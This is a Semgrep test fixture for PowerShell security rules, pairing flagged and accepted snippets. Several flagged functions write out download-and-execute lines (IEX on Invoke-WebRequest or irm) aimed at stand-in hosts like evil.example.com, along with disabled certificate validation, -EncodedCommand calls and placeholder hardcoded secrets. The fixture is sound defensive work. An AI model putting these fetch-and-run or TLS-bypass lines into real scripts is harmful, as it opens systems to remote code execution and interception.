# Semgrep test fixtures for powershell-unsafe-patterns.yml
#
# This file is used by `semgrep --test semgrep-rules/` to validate that each
# rule matches what it should and does not match what it should not.
#
# Reference: https://semgrep.dev/docs/writing-rules/testing-rules/
#
# Run tests:
#   semgrep --test semgrep-rules/

# =============================================================================
# powershell-download-execute
# =============================================================================

function Test-DownloadExecuteBad {
    # ruleid: powershell-download-execute, powershell-webrequest-basic-parsing
    $result = Invoke-WebRequest -Uri "https://evil.example.com/script.ps1"
    # ruleid: powershell-invoke-expression
    Invoke-Expression $result.Content
}

function Test-DownloadExecuteIRM {
    # ruleid: powershell-download-execute
    $script = Invoke-RestMethod -Uri "https://evil.example.com/script.ps1"
    # ruleid: powershell-invoke-expression
    Invoke-Expression $script
}

function Test-DownloadExecuteInline {
    # ruleid: powershell-download-execute, powershell-invoke-expression, powershell-webrequest-basic-parsing
    Invoke-Expression (Invoke-WebRequest -Uri "https://example.com/run.ps1")
}

function Test-DownloadExecuteIEX {
    # ruleid: powershell-download-execute, powershell-invoke-expression
    IEX (IWR -Uri "https://example.com/payload.ps1")
}

function Test-DownloadExecuteIrmIEX {
    # ruleid: powershell-download-execute, powershell-invoke-expression
    IEX (irm "https://example.com/payload.ps1")
}

function Test-DownloadExecuteIrmVar {
    # ruleid: powershell-download-execute
    $script = irm "https://example.com/payload.ps1"
    # ruleid: powershell-invoke-expression
    Invoke-Expression $script
}

function Test-DownloadExecuteOK {
    # ok: powershell-download-execute
    # todook: powershell-webrequest-basic-parsing
    $result = Invoke-WebRequest -Uri "https://example.com/data.json" -UseBasicParsing
    $data = $result.Content | ConvertFrom-Json
    Write-Output $data
}

# =============================================================================
# powershell-hardcoded-secret
# =============================================================================

function Test-HardcodedApiKey {
    # ruleid: powershell-hardcoded-secret
    $ApiKey = "sk-live-abcdef1234567890"
    return $ApiKey
}

function Test-HardcodedToken {
    # ruleid: powershell-hardcoded-secret
    $Token = "ghp_abc123def456ghi789"
    return $Token
}

function Test-HardcodedPassword {
    # ruleid: powershell-hardcoded-secret
    $Password = "SuperSecret123!"
    return $Password
}

function Test-HardcodedSecret {
    # ruleid: powershell-hardcoded-secret
    $Secret = "my-very-secret-value"
    return $Secret
}

function Test-HardcodedAccessKey {
    # ruleid: powershell-hardcoded-secret
    $AccessKey = "AKIAIOSFODNN7EXAMPLE"
    return $AccessKey
}

function Test-HardcodedClientSecret {
    # ruleid: powershell-hardcoded-secret
    $ClientSecret = "s3cr3t-client-value"
    return $ClientSecret
}

function Test-EnvVarApiKey {
    # ok: powershell-hardcoded-secret
    $ApiKey = $env:MY_API_KEY
    return $ApiKey
}

function Test-EnvVarToken {
    # ok: powershell-hardcoded-secret
    $Token = $env:GITHUB_TOKEN
    return $Token
}

function Test-EnvVarAccessKey {
    # ok: powershell-hardcoded-secret
    $AccessKey = $env:AWS_ACCESS_KEY_ID
    return $AccessKey
}

function Test-EnvVarClientSecret {
    # ok: powershell-hardcoded-secret
    $ClientSecret = $env:AZURE_CLIENT_SECRET
    return $ClientSecret
}

# =============================================================================
# powershell-disable-certificate-validation
# =============================================================================

function Test-DisableTLS {
    # ruleid: powershell-disable-certificate-validation
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
    # ruleid: powershell-webrequest-basic-parsing
    Invoke-WebRequest -Uri "https://internal.example.com"
}

# =============================================================================
# powershell-encoded-command
# =============================================================================

function Test-EncodedCommand {
    # ruleid: powershell-encoded-command
    powershell.exe -EncodedCommand "UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcw=="
}

function Test-EncodedCommandShort {
    # ruleid: powershell-encoded-command
    powershell -EncodedCommand "UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcw=="
}

function Test-PwshEncodedCommand {
    # ruleid: powershell-encoded-command
    pwsh -EncodedCommand "UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcw=="
}

function Test-EncodedCommandShortFlag {
    # ruleid: powershell-encoded-command
    powershell.exe -enc "UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcw=="
}

function Test-LegitimateBase64Decode {
    # ok: powershell-encoded-command
    $bytes = [Convert]::FromBase64String("SGVsbG8gV29ybGQ=")
    $text  = [Text.Encoding]::UTF8.GetString($bytes)
    Write-Output $text
}

# =============================================================================
# powershell-invoke-expression
# =============================================================================

function Test-InvokeExpression {
    # ruleid: powershell-invoke-expression
    Invoke-Expression "Get-Process"
}

function Test-InvokeExpressionAlias {
    # ruleid: powershell-invoke-expression
    IEX "Get-Process"
}

# =============================================================================
# powershell-scripts-to-process
# =============================================================================

# ruleid: powershell-scripts-to-process
ScriptsToProcess = @('Initialize-Module.ps1')

# =============================================================================
# powershell-unpinned-required-module
# =============================================================================

# ruleid: powershell-unpinned-required-module
RequiredModules = @( 'Az.Accounts' )

# ruleid: powershell-unpinned-required-module
RequiredModules = @( "PSReadLine" )
